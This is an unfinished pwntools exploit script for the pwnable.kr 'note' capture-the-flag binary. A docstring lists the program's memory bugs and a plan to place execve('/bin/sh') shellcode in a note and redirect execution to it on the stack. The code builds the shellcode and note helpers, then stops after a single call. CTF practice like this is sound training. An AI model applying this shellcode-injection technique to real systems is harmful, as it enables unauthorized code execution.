from pwn import *
from time import *
import re

context(arch="i386", os="linux")
context.log_level = "debug"
"""
[Protections]
-NX, Partial RELRO
[Bug]
    No ASLR !!
    mem_arr[256] - always empty
    write_note.gets() - over flow
    select_menu > recursive > pile stack infinitely
    0x31337(201527) >> hacker menu    
    mmap_s() - fd used after closed.
    
[Address]
    0xfffdd000 - 0xffffe000 (stack)

[Exploit]
    1. create first note & write shellcode. store shellcode address.
    2. create notes checking address that disclosure.
        compare address above and initial_ebp - 0x4c0 * n
    3. if address reach to stack, use menu-3(write) to fill the note with shell code address.
    4. menu-5
"""


def create(getresult=False):
    p.sendline(b"1")
    res = p.recvuntil(b"exit\n").decode()
    reg = re.compile(r'no.\d')
    no = reg.search(res).group()[-1:]
    reg = re.compile(r'\[.*]')
    add = reg.search(res).group()[1:-1]
    print(no, "note: ", add)
    if getresult:
        return no, add
    return


def write(pay):
    p.sendline(b"0")
    p.sendline(pay)
    p.recvuntil(b"exit\n")


p = process("/root/Downloads/note")
# p = remote("pwnable.kr", 9019)

init_esp = 0xffffcf30  # ebp-esp = 0x428
offset = 0x430
shellcode = asm(shellcraft.execve("/bin/sh"))

sleep(10)
p.recvuntil(b"exit\n")
##### Exploit ######
print(create())
